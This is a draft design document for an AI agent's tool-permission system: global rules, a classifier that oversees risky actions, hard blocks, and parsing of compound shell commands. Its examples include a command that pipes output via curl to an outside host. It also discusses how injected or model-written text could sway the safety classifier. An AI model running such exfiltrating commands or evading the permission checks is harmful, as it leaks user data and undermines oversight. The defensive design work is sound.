---
status: draft
priority: P0
owner: relixiaobo
created: 2026-05-29
updated: 2026-05-30
---

# Agent Tool Permissions

This plan replaces the earlier `approval_request` timeout proposal with a
single global runtime permission policy for agent tools.

The core rule is:

```txt
If a permission dialog appears, the action needs explicit user confirmation.
There is no countdown, no timeout approval, and no model-authored approval
request.
```

The product goal is still to prevent agent runs from getting stuck on low-value
prompts. The way to do that is not to add an approval parameter to every tool.
It is to make prompts rare: common actions should be allowed by global policy,
non-negotiable platform boundaries should be hard-blocked without a dialog, and
the runtime should use an independent classifier to resolve most actions that
would otherwise ask the user.

## Problem

The current approval model can block a run on `ask`. That fails when the user
starts a larger task, steps away, and later finds the agent stuck near the
beginning on a prompt that they would have approved.

The first proposed solution was to let the agent attach an `approval_request`
parameter to tool calls, with a timeout default of approve or deny. Deeper
review showed that this adds protocol complexity without solving the real
product problem:

- the runtime still cannot trust a model-authored field as a permission
  boundary;
- missing `approval_request` is ambiguous: routine action, already-approved
  policy, model omission, or prompt-injection influence;
- countdown approval is not real approval, because user absence becomes an
  approving signal;
- every important tool schema gets polluted with a non-domain parameter;
- high-risk actions still cannot safely proceed unattended.

The better shape is to keep tools focused on actions and move permission
decisions into one product-owned permission system.

## Decision Summary

1. **No `approval_request` parameter.** Tools should express the action only.
   Approval metadata should not be part of tool arguments.
2. **No countdowns.** A dialog means explicit user confirmation is required.
   Nothing auto-approves because time passed.
3. **One global permission rule set.** There are no session-scoped,
   run-scoped, or workspace-scoped permission grants. The same rules apply
   everywhere in the app.
4. **Runtime classifies tool actions.** The runtime maps a concrete tool call to
   an action kind, then checks the global rule for that kind.
5. **Classifier is the default `ask` resolver.** `ask` does not immediately mean
   "show a dialog." It means the action needs a resolver. The resolver first
   uses a runtime-owned classifier when the action is classifier-eligible; a
   dialog is only shown when the product truly needs explicit user judgement.
6. **No in-dialog "always deny".** If the agent requested an action, the action
   may be necessary for the task. The confirmation dialog should support
   `Deny once`, but it should not encourage one-click permanent denial.
7. **Use a cc-2.1-style settings shape.** Persistent rules live in one global
   JSON settings file with `permissions.allow`, `permissions.ask`, and
   `permissions.deny` arrays. The product UI can manage common allow/ask
   choices, while advanced users may edit the file directly for durable deny
   rules. The product does not need a dedicated capability-disable management
   surface.
8. **No user-facing permission modes.** Lin should not expose a mode carousel
   like default / auto / bypass. There is one policy: deterministic rules first,
   classifier for eligible `ask` actions, and explicit confirmation only when
   needed. This plan describes the full target design, not a staged roadmap.

## Decision Trail

The design moved through several rejected shapes:

1. **A smarter runtime risk matrix.** This keeps permissions deterministic, but
   it cannot understand task intent well enough by itself. "Is this tool
   dangerous?" is the wrong question for many cases.
2. **A separate agent decision tool.** This lets the agent express intent, but
   there is no transaction boundary that guarantees the next real tool call will
   match the prior decision.
3. **Inline `approval_request` on each tool call.** This makes the action and
   approval intent atomic, but it still cannot be trusted as a permission
   boundary, and it forces every important tool schema to carry approval
   metadata.
4. **Countdown approval.** This avoids some unattended stalls, but silence is not
   user approval. If a dialog appears, the product should treat it as requiring
   an explicit decision.
5. **Session or workspace grants.** These add management overhead and make it
   hard for the user to know the current permission state. The product does not
   need that complexity.
6. **A separate capability availability UI.** This creates another permission
   surface to explain and maintain. A cc-2.1-style settings file already gives
   advanced users a durable deny mechanism without adding a dedicated product
   manager for disabled capabilities.
7. **Separate permission modes.** cc-2.1 exposes default, accept-edits, bypass,
   don't-ask, and an automatic classifier-backed path. Lin should not expose
   those as user-facing modes. The classifier is useful, but it belongs inside
   the single permission flow rather than as a user-visible mode.

The resulting design keeps the useful part of the original runtime policy
approach: the runtime owns permission enforcement. It changes the user
experience by making that policy visible, global, and action-kind based.

## Mental Model

The user manages one global table:

```txt
Agent Tool Permissions

Action kind                             Permission

Read local data                         Allow
Search external information             Allow
Edit local documents                     Allow
Run local validation / project scripts   Allow / Ask
Install dependencies                     Allow / Ask
Delete local data                        Allow / Ask
Publish to a remote service              Allow / Ask
Send external messages                   Allow / Ask
Payment or purchase actions              Ask if supported
Modify agent permission settings         Platform block
```

These rules are global across the whole software. They do not depend on the
current document, run, session, directory, or project. If the user sets
`Install dependencies` to `Allow`, that is the rule everywhere until the user
changes it in the permission center.

This simplicity is intentional. The design should optimize for a user being able
to understand and manage the complete permission state at a glance.

The backing file should stay compatible in spirit with cc-2.1's settings model:
rules are grouped by behavior, not by UI page. Lin does not need to expose every
rule form in the UI, but it should keep the on-disk model legible for advanced
users:

```json
{
  "permissions": {
    "allow": [
      "Action(file.edit.allowed_file_area)",
      "Action(web.search)"
    ],
    "ask": [
      "Action(shell.dependency_install)",
      "Action(git.publish_remote)"
    ],
    "deny": [
      "Action(agent.permission.modify)",
      "Capability(external_messaging)"
    ]
  }
}
```

The product should write action-kind rules by default. Tool-specific rule
strings, such as future `Bash(...)` prefix rules, can be added only where the
runtime has a safe parser and validator. Users should not need to write these
rules for normal operation.

There is no separate automatic-permissions setting in the normal product.
Automatic classification is part of how `ask` is resolved.

## Runtime Flow

Every tool call follows the same path:

```txt
tool call
  -> validate tool schema and platform hard blocks
  -> derive one or more action descriptors from tool name and arguments
  -> read global permission rules for the derived action kinds
  -> deny: return a structured denied result to the agent
  -> allow: execute immediately
  -> ask: run the ask resolver
  -> hard block: return a structured denied result to the agent
```

The ask resolver is:

```txt
ask action
  -> non-classifier-eligible safety check: show dialog, or deny if prompts are unavailable
  -> deterministic fast path or safe allowlist: allow
  -> runtime classifier
       -> allow: execute
       -> block: return permission_denied and let the agent continue
       -> needs_user: show dialog, or deny if prompts are unavailable
       -> unavailable: show dialog in interactive contexts, deny in unattended contexts
```

This is the key difference from countdown approval. The user being absent never
means approval. It either means the classifier can safely allow the action, or
the agent receives a structured denied result and continues with a fallback.

`ask` is not the fallback for runtime uncertainty. If an action is unknown,
ambiguous, or outside the supported classification surface, the product should
ask only when the action is plausible and user-owned. Otherwise it should return
a platform hard block. This keeps popups meaningful instead of turning them into
a generic "runtime is unsure" bucket.

## Action Kinds

Permission rules should be based on action kind, not raw tool name.

`bash` is the clearest example:

```txt
bash: rg TODO src
  -> read/search local data

bash: bun test
  -> run local validation / project script

bash: bun add zod
  -> install dependencies

bash: git push origin main
  -> publish to remote service
```

The runtime does not need to become a general intelligence layer, but each
important tool must expose enough structured information for a stable
classification. For shell commands this likely means a conservative parser for
known command families, with unknown or ambiguous commands mapped to a safer
default action kind.

Local validation commands need explicit wording in the product. `bun test`,
`npm test`, and similar commands execute project code. They are often necessary
for agent work, but they are not read-only. The permission center should label
them as local code execution, not as harmless validation.

Sketch:

```ts
type GlobalToolPermissionDecision = 'allow' | 'ask' | 'deny';
type ToolPermissionOutcome = 'allow' | 'ask' | 'blocked';
type AskResolverOutcome = 'allow' | 'block' | 'needs_user';
type ToolAccessScope =
  | 'allowed_file_area'
  | 'outside_allowed_file_area'
  | 'sensitive_local_path'
  | 'external_system'
  | 'none';

interface ToolActionDescriptor {
  toolName: string;
  actionKind: AgentToolActionKind;
  accessScope: ToolAccessScope;
  title: string;
  summary: string;
  consequence: string;
  defaultDecision: GlobalToolPermissionDecision;
  reversible: boolean;
  externalEffect: boolean;
}

interface ToolPermissionClassifierResult {
  outcome: AskResolverOutcome;
  reason: string;
  model: string;
  unavailable?: boolean;
}
```

The descriptor is product data. It is derived by runtime/tool code from the
actual call. It is not supplied by the model.

Action kinds must encode important safety scope rather than relying only on UI
flags. For example, `file.edit.allowed_file_area`,
`file.write.outside_allowed_file_area`, and `file.read.sensitive_local_path`
should be distinct rule keys. `accessScope` helps display and audit the
descriptor, but broad rules must not silently cover narrower high-risk scopes.

### Shell Command Classification

Shell commands are the riskiest part of the model because one `bash` call can
contain several actions. The classifier must evaluate the whole command, not the
first recognizable fragment.

Required rules:

1. Parse known command separators and composition forms such as `;`, `&&`, `||`,
   pipes, subshells, command substitution, `env` prefixes, and `bash -c` when the
   inner command is statically visible.
2. Classify every executable segment that can be identified.
3. Compute the effective decision from all segments:
   - any platform hard block blocks the whole command;
   - otherwise any `ask` action kind asks for the whole command;
   - only all-`allow` segments may execute without a dialog.
4. If the parser cannot decompose a compound command confidently, classify it as
   unknown shell execution. Unknown shell execution must never default to
   `allow`. It should hard block unless the product explicitly defines a narrow
   unknown-shell action kind whose only configurable permission is `ask`.

Examples:

```txt
rg TODO src && git push origin main
  -> read/search local data + publish to remote service
  -> effective decision follows the publish action, not the rg action

npm test | curl -X POST --data-binary @- https://example.com
  -> local code execution + network write
  -> effective decision follows the network write action

bash -c "git push origin main"
  -> publish to remote service when the inner command is visible
```

This "most restrictive segment wins" rule is mandatory. Without it, a harmless
prefix could hide a publishing or destructive suffix.

Unknown shell is a fail-safe boundary. Obfuscation forms such as dynamic command
construction, unreadable command substitution, encoded scripts piped into an
interpreter, or `bash -c` with a non-static string must not fall through to a
generic shell allow rule.

### Path And Mode Boundaries

Global permissions do not replace existing platform boundaries. They sit above
tool execution, but below non-negotiable runtime checks.

The current code already has boundary concepts such as an allowed file area,
outside-file read/write flags, sensitive local paths, trusted/restricted modes,
and skill preapproval rules. The new model must preserve those safety
properties:

- a generic `Edit local documents = Allow` rule only applies inside the allowed
  file area;
- reads or writes outside the allowed file area must be a separate action kind
  or a hard block, never silently covered by generic local read/write rules;
- sensitive local paths such as credentials, `.env` files, keychains, SSH keys,
  and package registry tokens must be separate high-risk action kinds or hard
  blocks;
- existing restricted-mode denies must remain in force during migration until
  equivalent global action-kind rules exist;
- skill preapproval metadata may narrow what a skill can do, but it must not
  bypass path boundaries or platform hard blocks.

This keeps "one global permission table" as the user-facing management model
without turning global rules into broad filesystem capabilities.

## Ask Resolver Classifier

Lin should ship with classifier-backed ask resolution as part of the same
permission implementation. The classifier is inspired by cc-2.1's automatic
permission classifier, but it should be framed as a resolver inside the single
permission policy.

The classifier is a separate runtime-owned model call. The working agent does
not provide a safety decision and does not add permission metadata to tool
arguments.

The classifier is called only after deterministic permission checks:

```txt
platform hard block > configured deny > configured allow > ask resolver
```

It must not override hard blocks, configured deny rules, invalid schemas,
sensitive-path rules that are not classifier-eligible, or unsupported tool
surfaces.

Classifier input should be smaller and less injectable than the main model
context:

- include user text that establishes intent;
- include previous `tool_use` records;
- include the current tool action as the final record;
- exclude assistant prose, because it is model-authored and may be crafted to
  influence the classifier;
- let each tool expose a `toPermissionClassifierInput` projection so only
  security-relevant fields are sent.

Classifier output should be structured:

```ts
interface ToolPermissionClassifierResult {
  outcome: 'allow' | 'block' | 'needs_user';
  reason: string;
}
```

The outcomes mean:

- `allow`: execute the pending tool call without showing a dialog;
- `block`: return `permission_denied` with `reason: 'classifier_blocked'`;
- `needs_user`: show a confirmation dialog when interaction is available, or
  return `permission_denied` when interaction is unavailable.

The classifier should have deterministic fast paths before the model call:

- if the action would already be allowed by the local-edit fast path, allow it;
- if the tool is on a narrow safe allowlist, allow it;
- if a safety check is explicitly non-classifier-eligible, skip the classifier.

When the classifier is unavailable, malformed, or unparseable, it must not
silently allow. Interactive contexts may fall back to the confirmation dialog;
unattended contexts should return a structured denied result so the agent can
continue with a fallback.

Entering this single policy should also prevent dangerous allow rules from
bypassing the classifier. Overly broad shell or agent allow rules that would
skip ask resolution should be ignored or rejected with diagnostics.

## Global Permission Rules

The permission store is a single global settings object, shaped like cc-2.1's
`permissions` section:

```ts
interface GlobalToolPermissionRule {
  ruleValue: string;
  decision: GlobalToolPermissionDecision;
  updatedAt: number;
}
```

The persisted form should be grouped by behavior:

```json
{
  "permissions": {
    "allow": ["Action(file.edit.allowed_file_area)"],
    "ask": ["Action(git.publish_remote)"],
    "deny": ["Action(agent.permission.modify)"]
  }
}
```

No session state is stored. No workspace-specific override is stored. A pending
dialog can still be approved or denied once, but that does not create a stored
permission rule unless the user explicitly chooses an "always" action.

The permission center should show supported action kinds, their effective
allow/ask decision, and enough examples for the user to understand what each
rule covers. High-risk `allow` choices should be visually explicit, because
they apply globally.

If a user does not want confirmation for a risky action kind, the answer is to
change that global rule to `allow`. The model should not bypass confirmation by
adding metadata to the tool call, and the runtime should not silently create
temporary grants.

The global settings file can also contain `deny` rules. These are the advanced
user escape hatch for "never do this" preferences, but they are not the normal
product flow:

- the confirmation dialog has no `Always deny this kind` button;
- the product does not need a dedicated disabled-capabilities management UI;
- the permission center may show effective deny rules as read-only advanced
  state, but it should not require users to understand rule strings for common
  setup;
- invalid or unsupported deny rules should be ignored with a diagnostic rather
  than widening access.

Persistent deny is evaluated before ask/allow rules and returns a structured
denied result without opening a dialog. Platform hard blocks still live outside
the user permission table and cannot be relaxed by any settings file rule.

## Confirmation Dialog

A confirmation dialog is not a notification and not a timer. It means:

```txt
This action will not run until the user makes a decision.
```

Dialog buttons:

```txt
[Approve once] [Always allow this kind] [Deny once]
```

`Always allow this kind` updates the global permission rule for the action kind.
The once buttons only resolve the pending tool call and are recorded in the
event log. There is intentionally no `Always deny this kind` button. Durable
deny is reserved for advanced settings-file edits, not for the main approval
flow.

The dialog should show:

- the action kind;
- the concrete command or target action;
- the runtime-derived consequence;
- whether the action is reversible;
- whether the action affects external systems.

The dialog should not mention countdowns or imply that silence will approve.

If one tool call contains multiple action kinds, the dialog should identify the
action kind that forced the prompt and show the other material effects in
details. The user should not see "read local data" as the headline for a command
that also publishes to a remote service.

## Denied Results

Platform hard blocks, configured deny rules, classifier blocks, classifier
unavailability in unattended contexts, and explicit `Deny once` choices return
denied results. They should return structured data to the agent:

```ts
interface ToolDeniedResult {
  ok: false;
  kind: 'permission_denied';
  primaryActionKind: AgentToolActionKind;
  actionKinds: AgentToolActionKind[];
  reason:
    | 'platform_hard_block'
    | 'configured_deny'
    | 'classifier_blocked'
    | 'classifier_unavailable'
    | 'user_denied';
  message: string;
}
```

The agent should treat this as a normal tool result. It can continue with a
fallback, explain what could not be done, or ask the user in chat to change the
global permission if the action is essential.

This matters more than countdowns for unattended work. A denied result lets the
run keep moving when the user or product boundary has already decided that the
current action should not run.

## Platform Hard Blocks

Some actions are outside user-configurable permission policy. They should remain
hard-blocked even if a global rule is set to `allow`.

Examples:

- invalid tool schema;
- unknown tool;
- aborted run;
- disallowed access outside the allowed file area;
- permission self-modification by the agent;
- commands that attempt to destroy the host machine or bypass app safety
  boundaries;
- access to secrets or credentials that are not explicitly exposed through a
  supported tool contract.

These are product safety boundaries, not prompts. They should return
`platform_hard_block` results rather than asking the user to approve them.
Configured deny rules should be recorded separately as `configured_deny`
because they come from user-owned settings, but they still cannot override hard
blocks or expand access.

## Agent Behavior

The agent should not decide whether approval is required before calling a tool.
It should call the tool it needs for the task. The runtime handles permission.

Agent guidance should instead say:

- use tools normally when they are needed for the task;
- if a tool returns `permission_denied`, continue with a fallback when possible;
- if the denied action is essential, explain the required global permission to
  the user;
- do not try to bypass denied actions by using a lower-level tool;
- do not ask the user to approve routine work in chat when a tool would have
  been allowed by policy.

This keeps the model's job focused on task execution rather than permission
protocol bookkeeping.

## Event Log

Permission events should record the product decision source:

```ts
interface ToolPermissionCheckedEvent {
  type: 'tool.permission.checked';
  requestId: string;
  toolName: string;
  primaryActionKind: AgentToolActionKind;
  actionKinds: AgentToolActionKind[];
  outcome: ToolPermissionOutcome;
  source:
    | 'global_rule'
    | 'default_rule'
    | 'configured_deny'
    | 'classifier'
    | 'platform_hard_block';
  classifierResult?: ToolPermissionClassifierResult;
  descriptorRef?: AgentPayloadRef;
}
```

```ts
interface ToolPermissionResolvedEvent {
  type: 'tool.permission.resolved';
  requestId: string;
  approved: boolean;
  resolvedBy:
    | 'classifier'
    | 'user_once'
    | 'allow_rule_update'
    | 'abort';
  updatedRule?: GlobalToolPermissionRule;
}
```

There are no timeout fields because silence is not a permission decision.

## Relationship To Current Code

Today `src/main/agentPermissions.ts` computes `allow | ask | deny` from a
TypeScript policy. This plan keeps that overall runtime responsibility but
changes the model:

```txt
current:
tool policy matrix -> allow / ask / deny

proposed:
hard block check -> action descriptor -> global permission rules -> deny / allow / ask resolver
```

The difference is that the decision should be user-manageable and action-kind
based, not a hidden one-off prompt matrix. Runtime rules and classifier checks
are still necessary; they are product permission mechanisms rather than
agent-authored approval requests.

## Migration Notes

This plan supersedes the previous action-decision timeout design:

- remove `approval_request` from the proposal;
- do not add approval metadata to tool schemas;
- do not implement timeout approval or timeout denial;
- do not add session-scoped permission grants;
- keep explicit confirmation only for ask-resolver outcomes that need the user;
- include classifier-backed ask resolution in the shipped permission flow;
- implement a global permission center for common allow/ask management;
- store the source of truth in a cc-2.1-style global JSON settings file.

The shipped implementation should include a bounded, high-confidence set of
action kinds and classifier projections. It is better to classify fewer things
well than to create a broad classifier that asks too often or silently allows
ambiguous actions.

## Implementation Checklist

1. Define `AgentToolActionKind`, `GlobalToolPermissionDecision`,
   `ToolPermissionOutcome`, and `ToolActionDescriptor` in shared TypeScript
   types.
2. Add a global JSON permission store with `permissions.allow`,
   `permissions.ask`, and `permissions.deny` arrays.
3. Add a parser/validator for action-kind rules such as
   `Action(file.edit.allowed_file_area)` and advanced durable deny rules such as
   `Capability(external_messaging)`.
4. Add a permission center UI for common allow/ask management. Do not require a
   dedicated disabled-capabilities manager.
5. Build descriptor resolvers for existing agent tools.
6. Preserve existing path-boundary, sensitive-path, restricted-mode, and skill
   preapproval safety properties while mapping them into action descriptors or
   platform hard blocks.
7. For `bash`, classify known command families first, evaluate compound
   commands by the most restrictive segment, and hard block unknown shell unless
   a narrow ask-only unknown-shell action kind is explicitly defined.
8. Add `toPermissionClassifierInput` projections for classifier-eligible tools.
9. Add the ask resolver with local-edit fast path, safe allowlist, classifier,
   classifier unavailable handling, and non-classifier-eligible safety checks.
10. Replace hidden `ask` prompts with global-rule-backed permission checks.
11. Update the approval dialog to remove countdowns and session-scope language.
12. Add "approve once", "deny once", and "always allow this kind" resolution
   paths.
13. Return structured `permission_denied` tool results for user-denied,
    configured-deny, classifier-blocked, classifier-unavailable, and hard-block
    cases.
14. Update agent instructions so denied results are handled as normal tool
    results with fallbacks.
15. Add event log entries for permission checks, classifier decisions, and user
    resolutions.
16. Add tests for default allow, explicit ask, classifier allow, classifier
    block, classifier unavailable, approve once, deny once, always allow,
    configured deny, unknown shell fail-safe, platform hard blocks,
    denied-result fallback, path boundaries, restricted checks, and shell
    compound-command classification.

## Open Questions

- What is the initial global default for dependency installation?
- Which local editing operations are reversible enough to default to `allow`?
- Should repeated identical `ask` actions in one run be coalesced in the UI
  without creating a session permission grant?
- Should project script execution default to `allow` for productivity or `ask`
  because it is arbitrary local code execution?
- Which permission categories should be visible in the permission center?
- Should the classifier output be binary (`allow` / `block`) like cc-2.1, or
  tri-state (`allow` / `block` / `needs_user`) so prompts stay possible without
  treating risk as automatic denial?
- Should the settings file support only action-kind rule strings, or also a
  small subset of tool-specific strings such as `Bash(...)` once shell parsing
  is robust enough?
